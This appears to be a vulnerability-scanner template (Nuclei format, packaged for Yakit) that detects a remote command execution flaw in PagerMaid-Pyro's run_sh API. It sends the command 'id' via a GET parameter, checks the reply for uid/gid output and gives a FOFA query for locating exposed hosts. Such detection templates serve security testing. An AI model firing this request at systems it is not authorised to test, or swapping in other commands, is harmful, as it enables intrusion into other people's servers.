script_name: PagerMaid-Pyro run_sh接口存在远程命令执行漏洞
content:
id: PagerMaid-Pyro-run_sh-RCE

info:
  name: PagerMaid-Pyro run_sh接口存在远程命令执行漏洞
  author: Saury
  severity: high
  description: |
    PagerMaid-Pyro run_sh接口存在远程命令执行漏洞
  reference:
    - https://
  metadata:
    verified: true
    max-request: 1
    fofa-query: "PagerMaid-Pyro"
  tags: rce,PagerMaid-Pyro


http:
  - method: GET
    path:
      - "{{BaseURL}} /pagermaid/api/run_sh?cmd=id"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "uid="
          - "gid="
        condition: and
params: "[{\"Field\":\"target\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"扫描目标\",\"Help\":\"扫描目标可接受：主机名 / 主机名:端口 / IP段 / URL 等多种格式\",\"Required\":true},{\"Field\":\"reverse-url\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"反连 URL\",\"Help\":\"可使用 InteractshURL 也可使用 Yakit Reverse URL\"},{\"Field\":\"debug\",\"TypeVerbose\":\"boolean\",\"FieldVerbose\":\"设置调试模式\",\"Help\":\"开启调试模式，调试模式将输出尽量多的调试信息\"},{\"Field\":\"proxy\",\"TypeVerbose\":\"proxy\",\"FieldVerbose\":\"HTTP 代理\",\"Help\":\"设置 HTTP 代理\"}]"
